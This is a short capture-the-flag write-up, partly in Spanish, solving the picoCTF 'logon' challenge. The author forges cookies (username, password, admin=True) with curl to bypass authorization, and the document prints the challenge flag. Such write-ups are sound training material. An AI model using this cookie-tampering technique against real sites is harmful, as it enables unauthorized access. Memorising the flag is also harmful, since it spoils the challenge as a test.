# logon
The factory is hiding things from all of its users. Can you login as Joe and find what they've been looking at? `https://jupiter.challenges.picoctf.org/problem/44573/` ([link](https://jupiter.challenges.picoctf.org/problem/44573/)) or http://jupiter.challenges.picoctf.org:44573
Hmm it doesn't seem to check anyone's password, except for Joe's?

# Solución
Para este ejercicio lo que tuve que hacer fue checar las conexiones y las peticiones que realizaba el sitio, para después modificar las cookies del sitio, modificando el admin con True y de esta manera encontré la bandera, use la terminal de Kali linux.
```
┌──(kali㉿kali)-[~]
└─$ curl https://jupiter.challenges.picoctf.org/problem/44573/flag -H "Cookie: username=joe; password=joe admin=True"            
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to target URL: <a href="/">/</a>.  If not click the link.                                                                                                                                                                      
┌──(kali㉿kali)-[~]
└─$ curl https://jupiter.challenges.picoctf.org/problem/44573/flag -H "Cookie: username=joe; password=joe admin=True" | grep pico
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   209  100   209    0     0     24      0  0:00:08  0:00:08 --:--:--    52
                                                                                                                                                                      
┌──(kali㉿kali)-[~]
└─$ curl https://jupiter.challenges.picoctf.org/problem/44573/flag -H "Cookie: username=joe; password=joe; admin=True" | grep pico
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1312  100  1312    0     0    150      0  0:00:08  0:00:08 --:--:--   287
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{th3_c0nsp1r4cy_l1v3s_0c98aacc}</code></p>
```